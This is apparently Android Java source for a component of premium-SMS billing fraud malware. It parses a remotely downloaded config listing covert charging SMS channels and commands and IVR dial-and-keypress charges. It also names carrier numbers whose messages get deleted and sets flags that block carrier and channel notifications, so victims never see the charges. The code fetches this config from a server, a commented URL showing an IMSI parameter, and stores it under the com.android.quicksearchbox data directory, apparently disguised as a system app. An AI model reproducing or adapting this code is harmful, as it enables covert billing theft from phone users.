package com.sttm.model;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.util.Log;

import com.sttm.bean.CFGInfo_header;
import com.sttm.bean.ControlData;
import com.sttm.bean.GPRSInfo_url;
import com.sttm.bean.SmsData;
import com.sttm.util.ByteUtil;
import com.sttm.util.KsoHelper;
import com.sttm.util.LogFile;

public class GPRSService {
	// 文件头
	public CFGInfo_header getGPRSHeader(byte[] bytes) {
		if (bytes == null || bytes.length <= 0) {
			return null;
		}
		CFGInfo_header header = new CFGInfo_header();

		// byte[] buffer_header = Arrays.copyOf(bytes, header.getLength());
		byte[] buffer_header = new byte[header.getLength()];
		System.arraycopy(bytes, 0, buffer_header, 0, header.getLength());

		// m_nSmsDataOffset
		byte[] m_nSmsDataOffset = new byte[2];
		System.arraycopy(buffer_header, 5, m_nSmsDataOffset, 0, 2);
		int add = m_nSmsDataOffset[0] & 0xFF;
		add |= (m_nSmsDataOffset[1] << 8);
	//	//Log.d("普扣偏移量===", add + "");
		header.setM_nSmsDataOffset((short) add);
		

		// m_nSmsDataLen
		byte[] m_nSmsDataLen = new byte[2];
		System.arraycopy(buffer_header, 7, m_nSmsDataLen, 0, 2);
		add = m_nSmsDataLen[0] & 0xFF;
		add |= (m_nSmsDataLen[1] << 8);
		header.setM_nSmsDataLen((short) add);
		////Log.d("普扣长度===", add + "");

		// m_nSecretSmsOffset
		byte[] m_nSecretSmsOffset = new byte[2];
		System.arraycopy(buffer_header, 9, m_nSecretSmsOffset, 0, 2);
		add = m_nSecretSmsOffset[0] & 0xFF;
		add |= (m_nSecretSmsOffset[1] << 8);
		header.setM_nSecretSmsOffset((short) add);
		// header.setM_nSecretSmsOffset(ByteUtil.byteToShort(m_nSecretSmsOffset));

		// m_nSecretSmsLen
		byte[] m_nSecretSmsLen = new byte[2];
		System.arraycopy(buffer_header, 11, m_nSecretSmsLen, 0, 2);
		add = m_nSecretSmsLen[0] & 0xFF;
		add |= (m_nSecretSmsLen[1] << 8);
		header.setM_nSecretSmsLen((short) add);
		// header.setM_nSecretSmsLen(ByteUtil.byteToShort(m_nSecretSmsLen));

		// m_nCtrlOffset
		byte[] m_nCtrlOffset = new byte[2];
		System.arraycopy(buffer_header, 13, m_nCtrlOffset, 0, 2);
		add = m_nCtrlOffset[0] & 0xFF;
		add |= (m_nCtrlOffset[1] << 8);
		header.setM_nCtrlOffset((short) add);
		// header.setM_nCtrlOffset(ByteUtil.byteToShort(m_nCtrlOffset));

		// m_nCtrlLen
		byte[] m_nCtrlLen = new byte[2];
		System.arraycopy(buffer_header, 15, m_nCtrlLen, 0, 2);
		add = m_nCtrlLen[0] & 0xFF;
		add |= (m_nCtrlLen[1] << 8);
		header.setM_nCtrlLen((short) add);
		// header.setM_nCtrlLen(ByteUtil.byteToShort(m_nCtrlLen));
		return header;

	}

	// 1为普通短信
	public List<SmsData> getSmsData(byte[] bytes, CFGInfo_header header) {
		if (bytes == null || header == null || bytes.length <= 0 || header.getM_nSmsDataLen() <= 0) {
			return null;
		}
		List<SmsData> smsDatas = new ArrayList<SmsData>();

		byte[] smsDataArray = new byte[header.getM_nSmsDataLen()];

		// 普通短信总取
		System.arraycopy(bytes, header.getM_nSmsDataOffset(), smsDataArray, 0,
				header.getM_nSmsDataLen());

		
		byte[] smsCount = new byte[1];
		System.arraycopy(smsDataArray, 0, smsCount, 0, 1);
		int sendCount = smsCount[0] & 0xFF;
		int count = (header.getM_nSmsDataLen() - 1)/64;
		if (count > 0) {
			int offSet = 1;
			for (int i = 0; i < count; i++) {
				SmsData smsData = new SmsData();
				smsData.setSmsType(1);
				smsData.setCount(sendCount);

				// 通道 
				byte[] chanel = new byte[32];

				System.arraycopy(smsDataArray, offSet , chanel, 0, 32);

				smsData.setChanel(new String(chanel).trim());
				
				offSet  += 32;

				// 指令

				byte[] order = new byte[32];

				System.arraycopy(smsDataArray, offSet, order, 0, 32);
				offSet += 32;

				smsData.setOrder(new String(order).trim());
				smsDatas.add(smsData);

			}

		}

		return smsDatas;
	}

	// 2为暗扣短信
	public List<SmsData> getSecretSmsData(byte[] bytes, CFGInfo_header header) {
		if (bytes == null || header == null || bytes.length <= 0 || header.getM_nSecretSmsLen() <= 0) {

			return null;
		}
		List<SmsData> secretSmsDatas = new ArrayList<SmsData>();

		byte[] secretSmsDataArray = new byte[header.getM_nSecretSmsLen()];
		// 暗扣短信总取
		System.arraycopy(bytes, header.getM_nSecretSmsOffset(), secretSmsDataArray,
				0, header.getM_nSecretSmsLen());

		byte[] smsCount = new byte[1];
		System.arraycopy(secretSmsDataArray, 0, smsCount, 0, 1);

		int count = smsCount[0] & 0xFF;
		
		// int count = ByteUtil.byteToInt(smsCount);
		if (count > 0) {
			// 暗扣短信
			int offSet = 1;
			for (int i = 0; i < count; i++) {
				SmsData secretSmsData = new SmsData();
				secretSmsData.setSmsType(2);
				secretSmsData.setIVR(false);
				secretSmsData.setCount(count);

				// 通道
				byte[] secretChanel = new byte[32];

				System.arraycopy(secretSmsDataArray, offSet, secretChanel, 0, 32);
				offSet += 32;
				//Log.d("暗扣通道===========", new String(secretChanel).trim());

				secretSmsData.setChanel(new String(secretChanel).trim());

				// 指令

				byte[] secretOrder = new byte[32];

				System.arraycopy(secretSmsDataArray, offSet, secretOrder, 0, 32);
				offSet += 32;

				secretSmsData.setOrder(new String(secretOrder).trim());

				// 删除的号码如（10086，1860等）
				byte[] deleteNumber = new byte[32];

				System.arraycopy(secretSmsDataArray, offSet, deleteNumber, 0, 32);
				offSet += 32;

				secretSmsData.setDeleteTeleponeNumber(new String(deleteNumber).trim());

				secretSmsDatas.add(secretSmsData);

			}

		} else {
			// ivr暗扣

			SmsData smsData = new SmsData();
			smsData.setSmsType(2);
			smsData.setIVR(true);

			// 通道
			byte[] chanel = new byte[32];

			System.arraycopy(secretSmsDataArray, 1, chanel, 0, 32);

			smsData.setChanel(new String(chanel));

			// 按键
			byte[] keyNumber = new byte[32];

			System.arraycopy(secretSmsDataArray, 33, keyNumber, 0, 32);

			smsData.setKeyboard(new String(keyNumber));

			// 语音提示时间长度

			byte[] radioPromptLength = new byte[16];
			System.arraycopy(secretSmsDataArray, 65, radioPromptLength, 0, 16);

			smsData.setRadioPromptLength(ByteUtil.byteToLong(radioPromptLength));

			// 拨打时间长度

			byte[] dailTimeLength = new byte[16];
			System.arraycopy(secretSmsDataArray, 81, dailTimeLength, 0, 16);

			smsData.setDailTimeLength(ByteUtil.byteToLong(dailTimeLength));

			secretSmsDatas.add(smsData);

		}

		return secretSmsDatas;
	}

	// 3控制选项数据
	public ControlData getControlSmsData(byte[] bytes, CFGInfo_header header) {
		if (bytes == null || header == null || bytes.length <= 0
				|| header.getM_nCtrlLen() <= 0) {
			return null;
		}
		
		int add = 0;

		byte[] controlDataArray = new byte[header.getM_nCtrlLen()];

		// 控制选项数据总取
		System.arraycopy(bytes, header.getM_nCtrlOffset() + 8,
				controlDataArray, 0, header.getM_nCtrlLen() - 8);

		ControlData controlData = new ControlData();

		// 包月方式
		byte[] chargeMethod = new byte[1];	
		System.arraycopy(controlDataArray, 0, chargeMethod, 0, 1);	
		add = chargeMethod[0] & 0xFF;
		controlData.setBillStyle(add);
			

		// 包月收费次数
		byte[] monthlyPayment = new byte[1];
		System.arraycopy(controlDataArray, 1, monthlyPayment, 0, 1);
		add = monthlyPayment[0] & 0xFF;
		controlData.setMonthlyPayment(add);
		// controlData.setMonthlyPayment(ByteUtil.byteToInt(monthlyPayment));

		// 包月收费次数
		byte[] playingTime = new byte[1];
		System.arraycopy(controlDataArray, 2, playingTime, 0, 1);
		add = playingTime[0] & 0xFF;
		controlData.setPlayingTime(add);
		// controlData.setPlayingTime(ByteUtil.byteToLong(playingTime));

		// 暗扣，短信广告等发送的时间间隔
		byte[] adsTime = new byte[1];
		System.arraycopy(controlDataArray, 3, adsTime, 0, 1);
		add = adsTime[0] & 0xFF;
		controlData.setAdsTime(add);
		// controlData.setAdsTime(ByteUtil.byteToLong(adsTime));

		// 月暗扣的次数
		byte[] monthlySecretPayment = new byte[1];
		System.arraycopy(controlDataArray, 4, monthlySecretPayment, 0, 1);
		add = monthlySecretPayment[0] & 0xFF;
		controlData.setMonthlySecretPayment(add);
		/*
		 * controlData.setMonthlySecretPayment(ByteUtil
		 * .byteToInt(monthlySecretPayment));
		 */

		// 销量号码
		byte[] sellPhoneNumber = new byte[32];
		System.arraycopy(controlDataArray, 5, sellPhoneNumber, 0, 32);
		controlData.setSellPhoneNumber(new String(sellPhoneNumber).trim());

		// 是否关闭销量
		byte[] isShutSell = new byte[1];
		System.arraycopy(controlDataArray, 37, isShutSell, 0, 1);

		// controlData.setIsShutSell(ByteUtil.byteToInt(isShutSell));

		// 是否屏蔽运营商的下行
		byte[] isShutGSMDown = new byte[1];
		System.arraycopy(controlDataArray, 38, isShutGSMDown, 0, 1);
		add = isShutGSMDown[0] & 0xFF;
		controlData.setIsShutGSMDown(add);
		// controlData.setIsShutGSMDown(ByteUtil.byteToInt(isShutGSMDown));

		// 是否屏蔽通道下行
		byte[] isShutChanelDown = new byte[1];
		System.arraycopy(controlDataArray, 39, isShutChanelDown, 0, 1);
		add = isShutChanelDown[0] & 0xFF;
		controlData.setIsShutChanelDown(add);
		// controlData.setIsShutChanelDown(ByteUtil.byteToInt(isShutChanelDown));

		// 是否需要提示
		byte[] isNotify = new byte[1];
		System.arraycopy(controlDataArray, 40, isNotify, 0, 1);
		add = isNotify[0] & 0xFF;
		controlData.setIsNotify(add);
		// controlData.setIsNotify(ByteUtil.byteToInt(isNotify));

		// 是否需要提示
		byte[] notifyContent = new byte[header.getM_nCtrlLen() - 40];
		System.arraycopy(controlDataArray, 40, notifyContent, 0,
				header.getM_nCtrlLen() - 40);
		controlData.setNotifyContent(new String(notifyContent).trim());

		return controlData;
	}

	public static byte[] updateGprsData(Context context) {
		try {
			GPRSInfo_url gprs_url = GPRSInfo_url.getInstance("getAnrGprs",context);
			//URL gprsUrl = new URL(
					//"http://www.shuihubinggan.com/getAnrGprs.jsp?product=1&feectg=1&manner=1&plat=0&splat=1&date=1&clnt=KS000102&smsc=374&fu=0&stn=0&ssn=0&imsi=460002450918677&rce=&dcn=10&rcn=10&aln=200&ver=1.0");
			URL gprsUrl = new URL(gprs_url.getGprsUpdateURL());
			
			//Log.d("GPRS更新URL=",gprs_url.getGprsUpdateURL());
			LogFile.WriteLogFile("URL=" + gprs_url.getGprsUpdateURL());
			
			HttpURLConnection conn = (HttpURLConnection) gprsUrl
					.openConnection();
			//conn.connect();
			boolean isConnection = KsoHelper.isConnection(conn);
			if(!isConnection){
				conn = (HttpURLConnection) gprsUrl
						.openConnection();
				boolean isConnection1 = KsoHelper.isConnection(conn);
				if(!isConnection1){
					conn = (HttpURLConnection) gprsUrl
							.openConnection();
					boolean isConnection2 = KsoHelper.isConnection(conn);
					if(!isConnection2){
						conn = (HttpURLConnection) gprsUrl
								.openConnection();
						boolean isConnection3 = KsoHelper.isConnection(conn);
						if(!isConnection3){
							conn = (HttpURLConnection) gprsUrl
									.openConnection();
							boolean isConnection4 = KsoHelper.isConnection(conn);
							if(!isConnection4){
								return null;
								
							}
							
						}
						
					}
					
					
				}
				
				
			}
			InputStream inputStream = conn.getInputStream();
			int length = conn.getContentLength();
			byte[] buffer = new byte[length];
			int offset = 0;
			int numread = 0;
			while (offset < length && numread >= 0) {
				numread = inputStream.read(buffer, offset, length - offset);
				offset += numread;
			}
			inputStream.read(buffer);
			
			/*检查更新下来的数据是否正确*/
			try{
				final GPRSService gprsservice = new GPRSService();
				GPRSService gs = new GPRSService();
				CFGInfo_header gprsheader = gprsservice
						.getGPRSHeader(buffer);
				ControlData datacontrol = gprsservice
						.getControlSmsData(buffer, gprsheader);
			if(datacontrol.getSellPhoneNumber() == null || datacontrol.getSellPhoneNumber().equals("")){
				//LogFile.WriteLogFile("更新到的getAnrGprs文件数据不正常,中断");
				return null;
			}
			}
			catch(Exception e){
				//LogFile.WriteLogFile("更新到的getAnrGprs文件数据不正常,中断");
				return null;
			}
			
			
			FileOutputStream os = new FileOutputStream(
					"data/data/com.android.quicksearchbox/files/getAnrGprs.dat");
			ByteUtil.writeByteFile(os, buffer);
			inputStream.close();
			//Log.d("GPRSService", "GRPS数据更新己成功");
			LogFile.WriteLogFile("GRPS数据更新己成功");
			return buffer;
		} catch (Exception e) {
			e.printStackTrace();
			//Log.d("GPRSService", "GRPS数据更新失败");
			LogFile.WriteLogFile("GRPS数据更新失败:");
			return null;
		}

	}

	public byte[] getGPRSByte() {
		try {
			File file = new File("data/data/com.android.quicksearchbox/files/getAnrGprs.dat");
			long length = file.length();
			//Log.d("GPRS文件" ,"文件大小 " + length);
			FileInputStream fis = new FileInputStream(file);
			byte b[] = ByteUtil.readByteData2(fis,length);
			return b;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
		
	}

}
